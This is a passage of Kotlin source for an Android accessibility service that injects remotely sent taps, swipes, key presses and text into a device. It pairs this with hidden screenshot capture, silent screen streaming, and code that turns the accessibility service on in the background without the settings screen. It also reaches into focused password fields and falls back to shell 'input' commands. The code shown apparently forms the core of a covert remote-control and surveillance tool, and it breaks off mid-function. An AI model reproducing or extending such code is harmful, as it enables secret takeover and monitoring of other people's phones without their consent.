package com.screencapture.app.input

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.accessibilityservice.GestureDescription
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.ColorSpace
import android.graphics.Path
import android.graphics.Rect
import android.hardware.HardwareBuffer
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.SystemClock
import android.provider.Settings
import android.view.Display
import android.view.KeyEvent
import android.view.accessibility.AccessibilityManager
import android.view.accessibility.AccessibilityNodeInfo
import android.view.accessibility.AccessibilityWindowInfo
import com.screencapture.app.StartupController
import com.screencapture.app.screencapture.HiddenScreenshots
import com.genymobile.scrcpy.agent.SilentScreenStreamer
import org.json.JSONObject
import java.util.ArrayDeque
import java.util.concurrent.ConcurrentLinkedQueue
import java.util.concurrent.Executor
import java.util.concurrent.Executors
import kotlin.math.abs

/**
 * Injects remote mouse/keyboard events from the Qt server using Accessibility gestures.
 */
class RemoteInputService : AccessibilityService() {

    private data class PendingGesture(
        val gesture: GestureDescription,
        val fallback: (() -> Unit)?
    )

    private val mainHandler = InputPump.handler
    private val captureExecutor: Executor = Executors.newSingleThreadExecutor()
    private val gestureQueue = ArrayDeque<PendingGesture>()
    private var gestureBusy = false
    private var currentFallback: (() -> Unit)? = null
    private val busyWatchdog = Runnable {
        if (gestureBusy) {
            gestureQueue.clear()
            currentFallback = null
            gestureBusy = false
        }
    }

    // Live pointer collection matching RemoteApp AgentInputService.
    private val gestureX = FloatArray(MAX_GESTURE_POINTS)
    private val gestureY = FloatArray(MAX_GESTURE_POINTS)
    private var gesturePoints = 0
    private var gestureStartAt = 0L
    private var pointerDown = false

    override fun onCreate() {
        super.onCreate()
        StartupController.kick(this, "accessibility-create")
        drainPending()
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        StartupController.kick(this, "accessibility")
        drainPending()
        SilentScreenStreamer.resume()
    }

    override fun onUnbind(intent: Intent?): Boolean {
        if (instance === this) {
            instance = null
        }
        return true
    }

    override fun onRebind(intent: Intent?) {
        super.onRebind(intent)
        instance = this
        drainPending()
    }

    override fun onAccessibilityEvent(event: android.view.accessibility.AccessibilityEvent?) {
        scrollTargetAt = 0L
    }

    override fun onInterrupt() = Unit

    override fun onDestroy() {
        if (instance === this) {
            instance = null
        }
        super.onDestroy()
    }

    /**
     * AgentInputService.captureDisplay: AccessibilityService.takeScreenshot first.
     */
    fun captureScreenshot(callback: (Bitmap?) -> Unit) {
        if (Build.VERSION.SDK_INT < 30) {
            captureExecutor.execute { callback(HiddenScreenshots.capture(this)) }
            return
        }
        try {
            lastRateLimited = false
            takeScreenshot(
                Display.DEFAULT_DISPLAY,
                captureExecutor,
                object : TakeScreenshotCallback {
                    override fun onSuccess(result: ScreenshotResult) {
                        lastScreenshotError = 0
                        val bitmap = bitmapFromResult(result)
                        if (bitmap == null) {
                            lastScreenshotError = -2
                        }
                        callback(bitmap)
                    }

                    override fun onFailure(errorCode: Int) {
                        lastScreenshotError = errorCode
                        if (errorCode == ERROR_TAKE_SCREENSHOT_INTERVAL_TIME_SHORT) {
                            lastRateLimited = true
                            SilentScreenStreamer.noteRateLimited()
                            callback(null)
                            return
                        }
                        callback(HiddenScreenshots.capture(this@RemoteInputService))
                    }
                }
            )
        } catch (t: Throwable) {
            lastScreenshotError = -1
            captureExecutor.execute { callback(HiddenScreenshots.capture(this)) }
        }
    }

    private fun bitmapFromResult(result: ScreenshotResult): Bitmap? {
        val buffer: HardwareBuffer = result.hardwareBuffer ?: return null
        try {
            val color = result.colorSpace
            var wrapped = Bitmap.wrapHardwareBuffer(buffer, color)
            if (wrapped == null && color != null) {
                wrapped = Bitmap.wrapHardwareBuffer(buffer, ColorSpace.get(ColorSpace.Named.SRGB))
            }
            if (wrapped == null) return null
            val software = wrapped.copy(Bitmap.Config.ARGB_8888, false) ?: return null
            if (software !== wrapped) {
                wrapped.recycle()
            }
            return software
        } catch (t: Throwable) {
            return null
        } finally {
            try {
                buffer.close()
            } catch (_: Throwable) {
            }
        }
    }

    fun handleMouse(payload: JSONObject) {
        val run = {
            try {
                injectMouse(payload)
            } catch (t: Throwable) {
            }
            Unit
        }
        InputPump.post(run)
    }

    fun handleKey(payload: JSONObject) {
        val run = {
            try {
                injectKey(payload)
            } catch (t: Throwable) {
            }
            Unit
        }
        InputPump.post(run)
    }

    fun touch(action: String, x: Float, y: Float) {
        if (Build.VERSION.SDK_INT < 24) {
            return
        }
        InputPump.post { handleLiveTouch(action, x, y) }
    }

    private var scrollX = 0f
    private var scrollY = 0f
    private var scrollV = 0f
    private var scrollWant = false

    fun scroll(x: Float, y: Float, vertical: Float) {
        if (vertical == 0f) return
        InputPump.post {
            scrollX = x
            scrollY = y
            scrollV += vertical
            scrollWant = true
            pumpScroll()
        }
    }

    private fun releaseInput() {
        gestureBusy = false
        if (scrollWant && scrollV != 0f) pumpScroll()
        else if (liveWant || liveStroke != null) pumpLivePointer()
    }

    private fun pumpScroll() {
        if (Build.VERSION.SDK_INT < 26 || gestureBusy || !scrollWant || scrollV == 0f) return
        val (w, h) = screenSize()
        if (w < 3 || h < 3) return
        val step = scrollV
        val towardTop = step > 0f
        val x = scrollX.coerceIn(1f, (w - 2).toFloat())
        val y = scrollY.coerceIn(1f, (h - 2).toFloat())
        if (!canScrollContent(x, y, towardTop)) {
            scrollV -= step
            scrollWant = scrollV != 0f
            if (scrollWant) pumpScroll()
            return
        }
        val dist = (kotlin.math.abs(step) * 110f).coerceIn(72f, 220f)
        var y1 = y
        val down = towardTop
        if (down && h - 2f - y1 < dist) y1 = ((h - 2f) - dist).coerceAtLeast(1f)
        if (!down && y1 - 1f < dist) y1 = (1f + dist).coerceAtMost((h - 2).toFloat())
        val endY = (if (down) y1 + dist else y1 - dist).coerceIn(1f, (h - 2).toFloat())
        if (kotlin.math.abs(endY - y1) < 1f) {
            scrollV -= step
            scrollWant = scrollV != 0f
            return
        }
        val path = Path().apply {
            moveTo(x, y1)
            lineTo(x, endY)
        }
        val stroke = GestureDescription.StrokeDescription(path, 0, 28, false)
        gestureBusy = true
        val gesture = GestureDescription.Builder().addStroke(stroke).build()
        val ok = try {
            dispatchGesture(gesture, object : GestureResultCallback() {
                override fun onCompleted(g: GestureDescription?) {
                    mainHandler.post { releaseInput() }
                }

                override fun onCancelled(g: GestureDescription?) {
                    mainHandler.post { releaseInput() }
                }
            }, null)
        } catch (_: Throwable) {
            false
        }
        if (!ok) {
            gestureBusy = false
            mainHandler.postDelayed({ pumpScroll() }, 16)
            return
        }
        scrollV -= step
        scrollWant = scrollV != 0f
    }

    private var scrollTarget: AccessibilityNodeInfo? = null
    private val scrollTargetBounds = Rect()
    @Volatile private var scrollTargetAt = 0L
    private var scrollTargetMissing = false

    /** Finger-down moves the page toward the top. Skip the swipe when that edge is already reached. */
    private fun canScrollContent(x: Float, y: Float, towardTop: Boolean): Boolean {
        val now = SystemClock.uptimeMillis()
        val cached = scrollTarget
        val fresh = now - scrollTargetAt < 1500
        if (fresh && scrollTargetBounds.contains(x.toInt(), y.toInt())) {
            if (cached == null) return true
            if (try { cached.refresh() } catch (_: Throwable) { false }) {
                return directionOpen(cached, towardTop)
            }
        } else if (fresh && scrollTargetMissing && cached == null) {
            return true
        }
        findScrollTarget(x.toInt(), y.toInt())
        scrollTargetAt = now
        val node = scrollTarget ?: return true
        return directionOpen(node, towardTop)
    }

    private fun findScrollTarget(x: Int, y: Int) {
        try { scrollTarget?.recycle() } catch (_: Throwable) {}
        scrollTarget = null
        scrollTargetMissing = true
        scrollTargetBounds.setEmpty()
        val root = rootInActiveWindow ?: return
        try {
            var node: AccessibilityNodeInfo? = deepestNode(root, x, y)
            while (node != null) {
                if (node.isScrollable || hasScrollAction(node)) {
                    scrollTarget = node
                    scrollTargetMissing = false
                    node.getBoundsInScreen(scrollTargetBounds)
                    return
                }
                val parent = node.parent
                if (node !== root) node.recycle()
                node = parent
            }
            root.getBoundsInScreen(scrollTargetBounds)
        } catch (_: Throwable) {
        }
    }

    private fun deepestNode(node: AccessibilityNodeInfo, x: Int, y: Int): AccessibilityNodeInfo? {
        val bounds = Rect()
        node.getBoundsInScreen(bounds)
        if (!bounds.contains(x, y)) return null
        if (node.isScrollable) return node
        for (i in node.childCount - 1 downTo 0) {
            val child = node.getChild(i) ?: continue
            val hit = deepestNode(child, x, y)
            if (hit != null) {
                if (hit !== child) child.recycle()
                return hit
            }
            child.recycle()
        }
        return node
    }

    private fun hasScrollAction(node: AccessibilityNodeInfo): Boolean {
        for (action in node.actionList) {
            val id = action.id
            if (id == AccessibilityNodeInfo.AccessibilityAction.ACTION_SCROLL_UP.id
                || id == AccessibilityNodeInfo.AccessibilityAction.ACTION_SCROLL_DOWN.id
                || id == AccessibilityNodeInfo.AccessibilityAction.ACTION_SCROLL_BACKWARD.id
                || id == AccessibilityNodeInfo.AccessibilityAction.ACTION_SCROLL_FORWARD.id
            ) {
                return true
            }
        }
        return false
    }

    private fun directionOpen(node: AccessibilityNodeInfo, towardTop: Boolean): Boolean {
        var saw = false
        var open = false
        for (action in node.actionList) {
            val id = action.id
            val up = id == AccessibilityNodeInfo.AccessibilityAction.ACTION_SCROLL_UP.id
                || id == AccessibilityNodeInfo.AccessibilityAction.ACTION_SCROLL_BACKWARD.id
            val down = id == AccessibilityNodeInfo.AccessibilityAction.ACTION_SCROLL_DOWN.id
                || id == AccessibilityNodeInfo.AccessibilityAction.ACTION_SCROLL_FORWARD.id
            if (up || down) saw = true
            if (towardTop && up) open = true
            if (!towardTop && down) open = true
        }
        return if (saw) open else true
    }

    fun handleAndroidKey(keyCode: Int) {
        val run = {
            if (!globalKey(keyCode)) {
                when (keyCode) {
                    KeyEvent.KEYCODE_DEL -> deleteText()
                    KeyEvent.KEYCODE_ENTER, KeyEvent.KEYCODE_NUMPAD_ENTER -> imeEnter()
                }
            }
            Unit
        }
        InputPump.post(run)
    }

    fun typeText(text: String) {
        val run = {
            typeTextNow(text)
            Unit
        }
        InputPump.post(run)
    }

    private fun globalKey(keyCode: Int): Boolean {
        return when (keyCode) {
            KeyEvent.KEYCODE_BACK -> performGlobalAction(GLOBAL_ACTION_BACK)
            KeyEvent.KEYCODE_HOME -> performGlobalAction(GLOBAL_ACTION_HOME)
            KeyEvent.KEYCODE_APP_SWITCH -> performGlobalAction(GLOBAL_ACTION_RECENTS)
            else -> false
        }
    }

    private fun imeEnter(): Boolean {
        val focus = findFocus(AccessibilityNodeInfo.FOCUS_INPUT) ?: return false
        var ok = focus.performAction(AccessibilityNodeInfo.ACTION_CLICK)
        if (!ok && Build.VERSION.SDK_INT >= 30) {
            ok = focus.performAction(android.R.id.accessibilityActionImeEnter)
        }
        focus.recycle()
        return ok
    }

    private fun typeTextNow(text: String): Boolean {
        if (text.isEmpty()) {
            return false
        }
        val focus = findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
        if (focus == null || !focus.isEditable) {
            focus?.recycle()
            return false
        }
        val existing = focus.text
        val next = (existing?.toString() ?: "") + text
        val args = Bundle().apply {
            putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, next)
        }
        val ok = focus.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
        focus.recycle()
        return ok
    }

    private fun deleteText(): Boolean {
        val focus = findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
        if (focus == null || !focus.isEditable) {
            focus?.recycle()
            return false
        }
        val existing = focus.text
        if (existing == null || existing.isEmpty()) {
            focus.recycle()
            return false
        }
        val next = existing.subSequence(0, existing.length - 1).toString()
        val args = Bundle().apply {
            putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, next)
        }
        val ok = focus.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
        focus.recycle()
        return ok
    }

    private var liveStroke: GestureDescription.StrokeDescription? = null
    private var liveX = 0f
    private var liveY = 0f
    private var liveDown = false
    private var liveWant = false
    private var clickWait = false
    private var downX = 0f
    private var downY = 0f
    private var lastX = 0f
    private var lastY = 0f
    private val clickHold = Runnable {
        clickWait = false
        if (liveDown) pumpLivePointer()
    }

    private fun handleLiveTouch(action: String, x: Float, y: Float) {
        liveX = x
        liveY = y
        when (action) {
            "down" -> {
                liveDown = true
                liveStroke = null
                downX = x
                downY = y
                clickWait = true
                mainHandler.removeCallbacks(clickHold)
                mainHandler.postDelayed(clickHold, 12)
            }
            "move" -> {
                if (!liveDown) return
                val dx = x - downX
                val dy = y - downY
                if (clickWait && dx * dx + dy * dy < 36f) return
                clickWait = false
                mainHandler.removeCallbacks(clickHold)
                liveWant = true
                pumpLivePointer()
            }
            "up" -> {
                val waiting = clickWait && liveStroke == null
                clickWait = false
                mainHandler.removeCallbacks(clickHold)
                liveDown = false
                if (waiting) {
                    fastTap(x, y)
                    return
                }
                liveWant = true
                pumpLivePointer()
            }
        }
    }

    private fun fastTap(x: Float, y: Float) {
        if (Build.VERSION.SDK_INT < 26 || gestureBusy) {
            liveDown = false
            liveWant = true
            pumpLivePointer()
            return
        }
        val path = Path().apply {
            moveTo(x, y)
            lineTo(x + 1f, y)
        }
        val stroke = GestureDescription.StrokeDescription(path, 0, 40, false)
        gestureBusy = true
        val gesture = GestureDescription.Builder().addStroke(stroke).build()
        val ok = try {
            dispatchGesture(gesture, object : GestureResultCallback() {
                override fun onCompleted(g: GestureDescription?) {
                    mainHandler.post { releaseInput() }
                }
                override fun onCancelled(g: GestureDescription?) {
                    mainHandler.post { releaseInput() }
                }
            }, null)
        } catch (_: Throwable) {
            false
        }
        if (!ok) gestureBusy = false
    }

    /** One stroke at a time, always to the newest point. A drag is not replayed later. */
    private fun pumpLivePointer() {
        if (Build.VERSION.SDK_INT < 26 || gestureBusy) return
        if (!liveWant && liveStroke == null) return
        liveWant = false
        val x = liveX
        val y = liveY
        val cont = liveDown
        val fromX = if (liveStroke == null) downX else lastX
        val fromY = if (liveStroke == null) downY else lastY
        var toX = x
        var toY = y
        if (kotlin.math.abs(toX - fromX) < 1f && kotlin.math.abs(toY - fromY) < 1f) {
            toX = fromX + 1f
        }
        val path = Path().apply {
            moveTo(fromX, fromY)
            lineTo(toX, toY)
        }
        lastX = toX
        lastY = toY
        val stroke = if (liveStroke == null) {
            GestureDescription.StrokeDescription(path, 0, 16, cont)
        } else {
            liveStroke!!.continueStroke(path, 0, if (cont) 16L else 24L, cont)
        }
        liveStroke = if (cont) stroke else null
        gestureBusy = true
        val gesture = GestureDescription.Builder().addStroke(stroke).build()
        val ok = try {
            dispatchGesture(gesture, object : GestureResultCallback() {
                override fun onCompleted(g: GestureDescription?) {
                    mainHandler.post {
                        releaseInput()
                    }
                }

                override fun onCancelled(g: GestureDescription?) {
                    mainHandler.post {
                        gestureBusy = false
                        liveStroke = null
                        if (scrollWant && scrollV != 0f) {
                            pumpScroll()
                        } else if (liveDown) {
                            liveWant = true
                            pumpLivePointer()
                        }
                    }
                }
            }, null)
        } catch (_: Throwable) {
            false
        }
        if (!ok) {
            gestureBusy = false
            liveStroke = null
        }
    }

    private fun addGesturePoint(x: Float, y: Float) {
        if (gesturePoints > 0) {
            val dx = x - gestureX[gesturePoints - 1]
            val dy = y - gestureY[gesturePoints - 1]
            if (dx * dx + dy * dy < 4f && gesturePoints + 1 < MAX_GESTURE_POINTS) {
                gestureX[gesturePoints - 1] = x
                gestureY[gesturePoints - 1] = y
                return
            }
        }
        var i = gesturePoints
        if (i >= MAX_GESTURE_POINTS) {
            i = MAX_GESTURE_POINTS - 1
        } else {
            gesturePoints++
        }
        gestureX[i] = x
        gestureY[i] = y
    }

    private fun fireCollectedGesture() {
        if (gesturePoints <= 0) {
            return
        }
        val x1 = gestureX[0]
        val y1 = gestureY[0]
        val x2 = gestureX[gesturePoints - 1]
        val y2 = gestureY[gesturePoints - 1]
        val dx = x2 - x1
        val dy = y2 - y1
        val dist = kotlin.math.sqrt(dx * dx + dy * dy)
        if (dist < TAP_SLOP_PX) {
            liveTap(x2, y2)
            gesturePoints = 0
            return
        }
        val path = Path().apply {
            moveTo(x1, y1)
            if (gesturePoints == 2) {
                lineTo(x2, y2)
            } else {
                for (i in 1 until gesturePoints) {
                    lineTo(gestureX[i], gestureY[i])
                }
            }
        }
        val elapsed = SystemClock.uptimeMillis() - gestureStartAt
        val duration = kotlin.math.max(180L, kotlin.math.min(520L, kotlin.math.max(elapsed, (dist * 0.6f).toLong())))
        dispatchLive(GestureDescription.StrokeDescription(path, 0, duration))
        gesturePoints = 0
    }

    private fun liveTap(x: Float, y: Float) {
        val path = Path().apply {
            moveTo(x, y)
            lineTo(x + 1f, y)
        }
        dispatchLive(GestureDescription.StrokeDescription(path, 0, 40))
    }

    private fun liveSwipe(x1: Float, y1: Float, x2: Float, y2: Float) {
        val path = Path().apply {
            moveTo(x1, y1)
            lineTo(x2, y2)
        }
        dispatchLive(GestureDescription.StrokeDescription(path, 0, 180))
    }

    private fun dispatchLive(stroke: GestureDescription.StrokeDescription) {
        if (Build.VERSION.SDK_INT < 24) {
            return
        }
        val gesture = GestureDescription.Builder().addStroke(stroke).build()
        dispatchGesture(gesture, null, null)
    }

    private fun injectMouse(payload: JSONObject) {
        val type = payload.optString("type").lowercase()
        val nx = payload.optDouble("x", 0.5)
        val ny = payload.optDouble("y", 0.5)
        val x2 = payload.optDouble("x2", nx)
        val y2 = payload.optDouble("y2", ny)
        val (x, y) = toScreen(nx, ny)
        val (sx2, sy2) = toScreen(x2, y2)
        when (type) {
            "click", "tap", "up" -> {
                if (payload.has("x2") && (abs(x2 - nx) > 0.01 || abs(y2 - ny) > 0.01)) {
                    swipe(x, y, sx2, sy2, payload.optInt("duration", 180).toLong())
                } else {
                    tap(x, y, payload.optInt("duration", 100).toLong())
                }
            }
            "doubleclick", "dblclick", "double_click", "doubletap" ->
                doubleTap(x, y)
            "longpress" -> tap(x, y, payload.optInt("duration", 700).toLong())
            "swipe", "drag" -> swipe(
                x, y, sx2, sy2,
                payload.optInt("duration", 220).toLong()
            )
            "scroll" -> {
                val dy = payload.optDouble("deltaY", 0.0)
                val dx = payload.optDouble("deltaX", 0.0)
                swipe(
                    x, y,
                    (x + toScreenDeltaX(-dx * 0.18)).toFloat(),
                    (y + toScreenDeltaY(-dy * 0.18)).toFloat(),
                    160L
                )
            }
            "down" -> tap(x, y, 50L)
            else -> tap(x, y, 50L)
        }
    }

    private fun injectKey(payload: JSONObject) {
        val type = payload.optString("type", "press")
        if (type == "up") return
        val name = payload.optString("key").ifBlank {
            payload.optString("name")
        }.lowercase()
        val text = payload.optString("text")
        val ok = when {
            name == "back" || name == "escape" ->
                performGlobalAction(GLOBAL_ACTION_BACK)
            name == "home" ->
                performGlobalAction(GLOBAL_ACTION_HOME)
            name == "recents" || name == "app_switch" || name == "menu" ->
                performGlobalAction(GLOBAL_ACTION_RECENTS)
            name == "notifications" ->
                performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS)
            name == "power" ->
                performGlobalAction(GLOBAL_ACTION_POWER_DIALOG)
            name == "enter" || name == "return" -> {
                performEnter()
                true
            }
            name == "backspace" || name == "delete" -> {
                deleteChar(name == "delete")
                true
            }
            name == "tab" -> {
                injectText("\t")
                true
            }
            text.isNotEmpty() -> {
                injectText(text)
                true
            }
            name.length == 1 -> {
                injectText(name)
                true
            }
            else -> false
        }
        if (!ok && (name == "back" || name == "home" || name == "recents" ||
                name == "escape" || name == "app_switch" || name == "menu")
        ) {
            mainHandler.postDelayed({
                when (name) {
                    "back", "escape" -> performGlobalAction(GLOBAL_ACTION_BACK)
                    "home" -> performGlobalAction(GLOBAL_ACTION_HOME)
                    else -> performGlobalAction(GLOBAL_ACTION_RECENTS)
                }
            }, 60L)
        }
    }

    private fun tap(x: Float, y: Float, durationMs: Long) {
        val (w, h) = screenSize()
        if (w < 3 || h < 3) {
            return
        }
        val px = x.coerceIn(1f, (w - 2).toFloat())
        val py = y.coerceIn(1f, (h - 2).toFloat())
        val hold = durationMs.coerceIn(50L, 5_000L)
        val path = Path().apply {
            moveTo(px, py)
            lineTo(px, py)
        }
        val stroke = try {
            GestureDescription.StrokeDescription(path, 0, hold)
        } catch (_: Throwable) {
            val fallbackPath = Path().apply {
                moveTo(px, py)
                lineTo(px + 0.1f, py)
            }
            GestureDescription.StrokeDescription(fallbackPath, 0, hold)
        }
        enqueue(buildGesture(stroke)) {
            if (!clickNodeAt(px.toInt(), py.toInt())) {
                shellInput("tap", px.toInt().toString(), py.toInt().toString())
            }
        }
    }

    private fun doubleTap(x: Float, y: Float) {
        tap(x, y, 40L)
        mainHandler.postDelayed({ tap(x, y, 40L) }, 110)
    }

    private fun swipe(x1: Float, y1: Float, x2: Float, y2: Float, durationMs: Long) {
        val (w, h) = screenSize()
        val sx1 = x1.coerceIn(1f, (w - 2).toFloat())
        val sy1 = y1.coerceIn(1f, (h - 2).toFloat())
        var sx2 = x2.coerceIn(1f, (w - 2).toFloat())
        var sy2 = y2.coerceIn(1f, (h - 2).toFloat())
        if (abs(sx1 - sx2) < 2f && abs(sy1 - sy2) < 2f) {
            sy2 = (sy1 + 80f).coerceAtMost((h - 2).toFloat())
        }
        val path = Path().apply {
            moveTo(sx1, sy1)
            lineTo(sx2, sy2)
        }
        val stroke = try {
            GestureDescription.StrokeDescription(
                path, 0, durationMs.coerceIn(80L, 2_000L)
            )
        } catch (t: Throwable) {
            tap(sx1, sy1, 80L)
            return
        }
        enqueue(buildGesture(stroke)) {
            shellInput(
                "swipe",
                sx1.toInt().toString(),
                sy1.toInt().toString(),
                sx2.toInt().toString(),
                sy2.toInt().toString(),
                durationMs.coerceIn(80L, 2_000L).toString()
            )
        }
    }

    private fun shellInput(vararg args: String) {
        try {
            Runtime.getRuntime().exec(arrayOf("input", *args))
        } catch (t: Throwable) {
        }
    }

    private fun buildGesture(stroke: GestureDescription.StrokeDescription): GestureDescription {
        val builder = GestureDescription.Builder().addStroke(stroke)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                builder.setDisplayId(Display.DEFAULT_DISPLAY)
            } catch (_: Throwable) {
            }
        }
        return builder.build()
    }

    private fun enqueue(gesture: GestureDescription, fallback: (() -> Unit)? = null): Boolean {
        return try {
            if (gestureBusy) {
                gestureQueue.addLast(PendingGesture(gesture, fallback))
                true
            } else {
                startGesture(gesture, fallback)
            }
        } catch (t: Throwable) {
            fallback?.invoke()
            false
        }
    }

    private fun startGesture(gesture: GestureDescription, fallback: (() -> Unit)?): Boolean {
        gestureBusy = true
        currentFallback = fallback
        mainHandler.removeCallbacks(busyWatchdog)
        mainHandler.postDelayed(busyWatchdog, 900)
        val callback = object : GestureResultCallback() {
            override fun onCompleted(g: GestureDescription?) {
                mainHandler.post {
                    currentFallback = null
                    finishGesture()
                }
            }

            override fun onCancelled(g: GestureDescription?) {
                mainHandler.post {
                    val fb = currentFallback
                    currentFallback = null
                    finishGesture()
                    fb?.invoke()
                }
            }
        }
        val dispatched = try {
            dispatchGesture(gesture, callback, null)
        } catch (t: Throwable) {
            false
        }
        if (!dispatched) {
            val fb = currentFallback
            currentFallback = null
            finishGesture()
            fb?.invoke()
        }
        return dispatched
    }

    private fun finishGesture() {
        mainHandler.removeCallbacks(busyWatchdog)
        gestureBusy = false
        if (scrollWant && scrollV != 0f) {
            pumpScroll()
            return
        }
        if (gestureQueue.isEmpty()) return
        val next = gestureQueue.removeFirst()
        startGesture(next.gesture, next.fallback)
    }

    private fun isDefaultDisplayWindow(window: AccessibilityWindowInfo): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return true
        return try {
            window.displayId == Display.DEFAULT_DISPLAY
        } catch (_: Throwable) {
            true
        }
    }

    private fun clickNodeAt(x: Int, y: Int): Boolean {
        val (sw, sh) = screenSize()
        val maxArea = (sw * sh * 0.25f).toInt().coerceAtLeast(1)
        try {
            val wins = windows
            if (!wins.isNullOrEmpty()) {
                for (window in wins) {
                    if (!isDefaultDisplayWindow(window)) continue
                    val root = window.root ?: continue
                    val node = findSmallestClickable(root, x, y) ?: continue
                    if (nodeArea(node) > maxArea) continue
                    if (node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                        return true
                    }
                }
            }
        } catch (t: Throwable) {
        }
        val root = rootInActiveWindow ?: return false
        val node = findSmallestClickable(root, x, y) ?: findSmallestNodeAt(root, x, y)
        if (node == null) {
            return false
        }
        if (nodeArea(node) > maxArea && !node.isClickable) {
            return false
        }
        return node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
    }

    private fun nodeArea(node: AccessibilityNodeInfo): Int {
        val bounds = Rect()
        node.getBoundsInScreen(bounds)
        return (bounds.width() * bounds.height()).coerceAtLeast(0)
    }

    private fun findSmallestClickable(node: AccessibilityNodeInfo, x: Int, y: Int): AccessibilityNodeInfo? {
        val bounds = Rect()
        node.getBoundsInScreen(bounds)
        if (!bounds.contains(x, y)) {
            return null
        }
        var best: AccessibilityNodeInfo? = if (node.isClickable || node.isLongClickable) node else null
        var bestArea = if (best != null) bounds.width() * bounds.height() else Int.MAX_VALUE
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val match = findSmallestClickable(child, x, y) ?: continue
            val cb = Rect()
            match.getBoundsInScreen(cb)
            val area = cb.width() * cb.height()
            if (area in 1 until bestArea) {
                best = match
                bestArea = area
            }
        }
        return best
    }

    private fun findSmallestNodeAt(node: AccessibilityNodeInfo, x: Int, y: Int): AccessibilityNodeInfo? {
        val bounds = Rect()
        node.getBoundsInScreen(bounds)
        if (!bounds.contains(x, y)) {
            return null
        }
        var best: AccessibilityNodeInfo = node
        var bestArea = bounds.width() * bounds.height()
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val match = findSmallestNodeAt(child, x, y) ?: continue
            val cb = Rect()
            match.getBoundsInScreen(cb)
            val area = cb.width() * cb.height()
            if (area in 1 until bestArea) {
                best = match
                bestArea = area
            }
        }
        return best
    }

    private fun performEnter() {
        val focused = focusedEdit()
        if (focused != null) {
            val ok = focused.performAction(0x00400000)
            if (!ok) {
                focused.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            }
            return
        }
        injectText("\n")
    }

    private fun deleteChar(forward: Boolean) {
        val focused = focusedEdit() ?: return
        val current = focused.text?.toString().orEmpty()
        val next = if (current.isEmpty()) {
            ""
        } else if (forward) {
            current.drop(1)
        } else {
            current.dropLast(1)
        }
        val args = Bundle().apply {
            putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, next)
        }
        focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
    }

    private fun injectText(text: String) {
        if (text.isEmpty()) return
        val focused = focusedEdit()
        if (focused != null) {
            val current = focused.text?.toString().orEmpty()
            val args = Bundle().apply {
                putCharSequence(
                    AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                    current + text
                )
            }
            focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
            return
        }
        val root = rootInActiveWindow ?: return
        val args = Bundle().apply {
            putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
        }
        root.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
    }

    private fun focusedEdit(): AccessibilityNodeInfo? {
        val root = rootInActiveWindow ?: return null
        return findFocusedEdit(root)
    }

    private fun findFocusedEdit(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        if (node.isFocused && (node.isEditable || node.isPassword)) {
            return node
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val found = findFocusedEdit(child)
            if (found != null) return found
        }
        return null
    }

    private fun toScreen(nx: Double, ny: Double): Pair<Float, Float> {
        val (w, h) = screenSize()
        val x = (nx.coerceIn(0.0, 1.0) * (w - 1).coerceAtLeast(1)).toFloat()
        val y = (ny.coerceIn(0.0, 1.0) * (h - 1).coerceAtLeast(1)).toFloat()
        return x to y
    }

    private fun toScreenDeltaX(nx: Double): Int {
        val (w, _) = screenSize()
        return (nx * w).toInt()
    }

    private fun toScreenDeltaY(ny: Double): Int {
        val (_, h) = screenSize()
        return (ny * h).toInt()
    }

    private fun screenSize(): Pair<Int, Int> = ScreenMetrics.size(this)

    companion object {
        private const val MAX_GESTURE_POINTS = 64
        private const val TAP_SLOP_PX = 28f
        private val pendingMouse = ConcurrentLinkedQueue<JSONObject>()
        private val pendingKey = ConcurrentLinkedQueue<JSONObject>()

        @Volatile
        var instance: RemoteInputService? = null
            private set

        @Volatile
        var lastScreenshotError: Int = 0
            private set

        @Volatile
        var lastRateLimited: Boolean = false
            private set

        fun isConnected(): Boolean = instance != null

        /**
         * Enables this Accessibility service in the background (no settings UI),
         * matching RemoteApp AgentInput.ensureAccessibility.
         */
        fun ensureAccessibility(context: Context) {
            if (instance != null) {
                return
            }
            val app = context.applicationContext
            enableViaSettings(app)
            if (instance != null) {
                return
            }
            enableViaShell(app)
        }

        private fun serviceNames(context: Context): List<String> {
            val cn = ComponentName(context, RemoteInputService::class.java)
            return listOf(
                cn.flattenToString(),
                cn.flattenToShortString()
            )
        }

        private fun enableViaSettings(context: Context): Boolean {
            return try {
                val resolver = context.contentResolver
                val current = Settings.Secure.getString(
                    resolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                )
                var next = current
                for (name in serviceNames(context)) {
                    next = mergeEnabledServices(next, name)
                }
                val wrote = Settings.Secure.putString(
                    resolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES,
                    next
                )
                Settings.Secure.putInt(resolver, Settings.Secure.ACCESSIBILITY_ENABLED, 1)
